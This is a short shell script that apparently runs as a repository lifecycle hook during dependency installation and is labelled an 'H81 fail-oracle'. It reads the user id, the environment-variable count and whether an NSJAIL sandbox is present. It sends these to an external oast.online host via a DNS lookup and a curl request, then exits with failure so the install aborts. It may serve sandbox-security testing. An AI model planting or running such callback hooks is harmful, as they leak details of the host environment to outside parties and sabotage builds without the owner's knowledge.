#!/bin/sh
# H81 fail-oracle: if the installer executes repository lifecycle scripts, this
# exit 1 must abort dependency installation, so ESLint cannot run with the
# pinned version. Callbacks are best-effort only (uid + env-name count).
L="fail"
P="dc1hkt3kvv17699hpv0gam4nqd63ajqhc.oast.online"
Q="dc1hkt3kvv17699hpv0gfd7kd349ndaqg.oast.online"
U=$(id -u 2>/dev/null)
EN=$(env 2>/dev/null | wc -l)
NS=$(grep -c NSJAIL /proc/self/cgroup 2>/dev/null || echo 0)
echo "H81-FAIL label=$L uid=$U envn=$EN nsjail=$NS"
getent hosts "h81fail-${L}-u${U}-e${EN}-ns${NS}.$P" >/dev/null 2>&1 || true
curl -sS -m 8 "http://$P/h81-fail-${L}?u=$U&e=$EN&ns=$NS" >/dev/null 2>&1 || true
if false; then getent hosts "h81never-fail-control.$Q" >/dev/null 2>&1 || true; fi
exit 1
